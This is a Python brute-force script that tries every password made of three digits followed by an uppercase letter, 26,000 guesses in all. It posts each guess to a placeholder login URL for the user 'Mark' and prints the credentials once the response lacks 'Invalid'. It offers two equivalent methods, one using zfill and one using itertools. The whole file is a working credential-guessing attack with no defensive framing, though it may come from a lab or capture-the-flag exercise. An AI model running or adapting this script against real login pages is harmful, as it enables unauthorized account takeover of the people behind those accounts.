"""
Brute-force script for structured passwords.

Pattern:
- First 3 characters → digits (000–999)
- Last character → uppercase letter (A–Z)

Includes two methods:
1. Using zfill (simple approach)
2. Using itertools (flexible approach)
"""

import requests
import string
import itertools

# -- target configuration
url = "http://target-url"
username = "Mark"


# -- method 1: using zfill (simple and direct)
def brute_force_zfill():

    # loop through numbers 0 → 999
    for i in range(1000):

        # loop through A → Z
        for c in string.ascii_uppercase:

            # build password: 3 digits + 1 letter
            password = str(i).zfill(3) + c

            # prepare login request
            data = {
                "username": username,
                "password": password
            }

            response = requests.post(url, data=data)

            # check if login is successful
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                return
            else:
                print(f"[-] Attempted: {password}")


# -- method 2: using itertools (more flexible)
def brute_force_itertools():

    digits = string.digits
    letters = string.ascii_uppercase

    # generate all 3-digit combinations
    for d in itertools.product(digits, repeat=3):

        # loop through letters
        for c in letters:
            
            # convert tuple → string and append letter
            password = ''.join(d) + c

            # prepare login request
            data = {
                "username": username,
                "password": password
            }

            response = requests.post(url, data=data)

            # check if login is successful
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                return
            else:
                print(f"[-] Attempted: {password}")


if __name__ == "__main__":
    # choose ONE method
    brute_force_zfill()
    # brute_force_itertools()